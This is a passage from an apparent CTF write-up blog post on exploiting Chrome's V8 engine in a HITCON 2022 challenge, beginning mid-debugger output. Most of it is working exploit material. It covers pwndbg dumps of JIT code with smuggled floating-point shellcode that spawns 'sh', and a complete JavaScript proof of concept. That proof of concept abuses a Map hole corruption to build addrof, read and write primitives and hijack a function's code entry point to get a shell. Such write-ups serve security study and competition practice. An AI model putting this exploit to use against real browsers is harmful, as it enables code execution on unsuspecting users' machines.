</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/20wx 0x1d9d0019a79d-1
</span></span><span class="line"><span class="cl">0x1d9d0019a79c:	0x00002a71	0x000023e1	0xc0004781	0xc00047c0
</span></span><span class="line"><span class="cl">0x1d9d0019a7ac:	0x00005554	0xffff001d	0x00000004	0x000079f9
</span></span><span class="line"><span class="cl">0x1d9d0019a7bc:	0x000023e1	0x00000000	0x00000000	0x00000002
</span></span><span class="line"><span class="cl">0x1d9d0019a7cc:	0x00000002	0x000023e1	0x000079f9	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0019a7dc:	0x002875c9	0x000023e1	0x00000002	0x00000002
</span></span><span class="line"><span class="cl">pwndbg&gt; job 0x1d9d0019a79d
</span></span><span class="line"><span class="cl">0x1d9d0019a79d: [CodeDataContainer] in OldSpace
</span></span><span class="line"><span class="cl"> - map: 0x1d9d00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
</span></span><span class="line"><span class="cl"> - kind: TURBOFAN
</span></span><span class="line"><span class="cl"> - is_off_heap_trampoline: 0
</span></span><span class="line"><span class="cl"> - code: 0x5554c0004781 &lt;Code TURBOFAN&gt;
</span></span><span class="line"><span class="cl"> - code_entry_point: 0x5554c00047c0
</span></span><span class="line"><span class="cl"> - kind_specific_flags: 4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; job 0x5554c0004781
</span></span><span class="line"><span class="cl">0x5554c0004781: [Code]
</span></span><span class="line"><span class="cl"> - map: 0x1d9d0000264d &lt;Map(CODE_TYPE)&gt;
</span></span><span class="line"><span class="cl"> - code_data_container: 0x1d9d0019a79d &lt;CodeDataContainer TURBOFAN&gt;
</span></span><span class="line"><span class="cl">kind = TURBOFAN
</span></span><span class="line"><span class="cl">stack_slots = 6
</span></span><span class="line"><span class="cl">compiler = turbofan
</span></span><span class="line"><span class="cl">address = 0x5554c0004781
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Instructions (size = 360)
</span></span><span class="line"><span class="cl">0x5554c00047c0     0  8b59d0               movl rbx,[rcx-0x30]
</span></span><span class="line"><span class="cl">0x5554c00047c3     3  4903de               REX.W addq rbx,r14
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x5554c0004831    71  49ba682f73680058eb0c REX.W movq r10,0xceb580068732f68
</span></span><span class="line"><span class="cl">0x5554c000483b    7b  c4c1f96ec2           vmovq xmm0,r10
</span></span><span class="line"><span class="cl">0x5554c0004840    80  c5fb11410f           vmovsd [rcx+0xf],xmm0
</span></span><span class="line"><span class="cl">0x5554c0004845    85  49ba682f62696e5aeb0c REX.W movq r10,0xceb5a6e69622f68
</span></span><span class="line"><span class="cl">0x5554c000484f    8f  c4c1f96ec2           vmovq xmm0,r10
</span></span><span class="line"><span class="cl">0x5554c0004854    94  c5fb114117           vmovsd [rcx+0x17],xmm0
</span></span><span class="line"><span class="cl">0x5554c0004859    99  49ba48c1e02031f6eb0c REX.W movq r10,0xcebf63120e0c148
</span></span><span class="line"><span class="cl">0x5554c0004863    a3  c4c1f96ec2           vmovq xmm0,r10
</span></span><span class="line"><span class="cl">0x5554c0004868    a8  c5fb11411f           vmovsd [rcx+0x1f],xmm0
</span></span><span class="line"><span class="cl">0x5554c000486d    ad  49ba4801d031d250eb0c REX.W movq r10,0xceb50d231d00148
</span></span><span class="line"><span class="cl">0x5554c0004877    b7  c4c1f96ec2           vmovq xmm0,r10
</span></span><span class="line"><span class="cl">0x5554c000487c    bc  c5fb114127           vmovsd [rcx+0x27],xmm0
</span></span><span class="line"><span class="cl">0x5554c0004881    c1  49ba4889e76a3b580f05 REX.W movq r10,0x50f583b6ae78948
</span></span></code></pre></td></tr></table>
</div>
</div><p>Inside <code>code</code> property, we have two interesting properties:</p>
<ul>
<li><code>code</code>: Points to the jitted code area. (<code>code+0x8</code>)</li>
<li><code>code_entry_point</code>: Points to the starting of the jitted code instructions. (<code>code + 0xc</code>)</li>
</ul>
<p>As you can see from the examination via <code>job</code>, the <code>foo-&gt;code-&gt;code</code> properties is filled with the address of the jitted code area. Also notice that in the generated instructions, we successfully smuggled our floating point in there.</p>
<p>Notice that <code>0xceb580068732f68</code> is actually the hex representation of our first floating point in <code>foo</code> method (<code>1.95538254221075331056310651818E-246</code>). And it is actually a shellcode to perform <code>push 'sh\x00' to stack</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   0:   68 2f 73 68 00          push   0x68732f
</span></span><span class="line"><span class="cl">   5:   58                      pop    rax
</span></span><span class="line"><span class="cl">   6:   eb 0c                   jmp    0x14
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you notice, our shellcode instruction max length is 6 because the last two bytes will be used to jump to the next smuggled shellcode (the next floating point value, which is stored in the next <code>mov</code> instructions).</p>
<p>Remember that we have read and write gadgets. Take a look in the <code>foo-&gt;code</code> properties again. <code>code_entry_point</code> will be used by <code>v8</code> during we call <code>foo</code>, where <code>v8</code> will jump to the stored address inside <code>code_entry_point</code>. If we&rsquo;re able to overwrite this value, basically we have successfully controlled the <code>v8</code> RIP.</p>
<h3 id="final-step">Final Step</h3>
<p>With our <code>write</code> gadget, let&rsquo;s overwrite this <code>code_entry_point</code> by shifting its stored value to point to our first smuggled shellcode so that when we call <code>foo</code>, it will jump and execute our crafted shellcode. Notes that it is better to put the targeted JIT code at the top of our file so that it won&rsquo;t mess up our created read-and-write gadgets.</p>
<p>So, modify our <code>poc.js</code> to:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">foo</span> <span class="o">=</span> <span class="p">()=&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="mf">1.0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.95538254221075331056310651818</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.95606125582421466942709801013</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.99957147195425773436923756715</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1.95337673326740932133292175341</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mf">2.63486047652296056448306022844</span><span class="nx">E</span><span class="o">-</span><span class="mi">284</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">foo</span><span class="p">();</span><span class="nx">foo</span><span class="p">();</span><span class="nx">foo</span><span class="p">();</span><span class="nx">foo</span><span class="p">();}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">oob_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">victim</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{},</span> <span class="p">{},</span> <span class="p">{}];</span>
</span></span><span class="line"><span class="cl"><span class="nx">read_gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mask</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl">    <span class="nx">victim</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">37</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x600000000</span><span class="nx">n</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">read_gadget</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">weak_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">37</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x600000000</span><span class="nx">n</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">read_gadget</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">f_code</span> <span class="o">=</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">foo</span><span class="p">)</span><span class="o">+</span><span class="mh">0x18</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">f_code_code_entry_point</span> <span class="o">=</span> <span class="nx">weak_read</span><span class="p">(</span><span class="nx">f_code</span><span class="o">+</span><span class="mh">0xc</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">weak_write</span><span class="p">(</span><span class="nx">f_code</span><span class="o">+</span><span class="mh">0xc</span><span class="nx">n</span><span class="p">,</span> <span class="nx">f_code_code_entry_point</span><span class="o">+</span><span class="mi">124</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">foo</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What I do in the last step after creating these primitives are:</p>
<ul>
<li>Get the <code>foo-&gt;code</code> stored pointer address by:
<ul>
<li>Do <code>addrof</code> of <code>foo</code>.</li>
</ul>
</li>
<li><code>weak_read</code> the address of <code>foo-&gt;code</code> which is equivalent to <code>foo+0x18</code> (Offset found by examination in <code>gdb</code>).
<ul>
<li>Let&rsquo;s call the fetched value as <code>f_code</code></li>
</ul>
</li>
<li><code>weak_read</code> the value of <code>f_code-&gt;code_entry_point</code> which is equivalent to <code>f_code+0xc</code>.
<ul>
<li>Let&rsquo;s call the fetched value as <code>f_code_code_entry_point</code></li>
</ul>
</li>
<li><code>weak_write</code> the property <code>f_code-&gt;code_entry_point</code> which is equivalent to <code>f_code+0xc</code> by <code>f_code_code_entry_point+shift_offset</code>, where the <code>shift_offset</code> is the distance between the starting JIT code instructions and your smuggled shellcode.</li>
</ul>
<blockquote>
<p><strong>Notes:</strong> The offset of the smuggled shellcode in the jitted area is different between ubuntu and debian. So, if you want to run this POC in ubuntu, you might need to adjust the offset to be added in our leaked <code>f_code_code_entry_point</code> value during the last call of <code>weak_write</code>.</p>
</blockquote>
<p>And let&rsquo;s try to execute this. We will get a shell!</p>
<img src="https://i.imgur.com/SGFdLxM.png">
<blockquote>
<p><strong>Flag:</strong> hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((}</p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/hitcon-ctf-2022/" data-title="HITCON CTF 2022" data-via="Chovid99" data-hashtags="Writeup,HITCON,pwn,chrome,v8,JIT,browser,oob,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/hitcon-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/hitcon/">HITCON</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/chrome/">Chrome</a>,&nbsp;<a href="/tags/v8/">V8</a>,&nbsp;<a href="/tags/jit/">JIT</a>,&nbsp;<a href="/tags/browser/">Browser</a>,&nbsp;<a href="/tags/oob/">Oob</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/file-structure-attack-part-1/" class="prev" rel="prev" title="FILE Structure Attack: Part 1"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>FILE Structure Attack: Part 1</a>
            <a href="/posts/stack-the-flags-ctf-2022/" class="next" rel="next" title="STACK the Flags CTF 2022">STACK the Flags CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
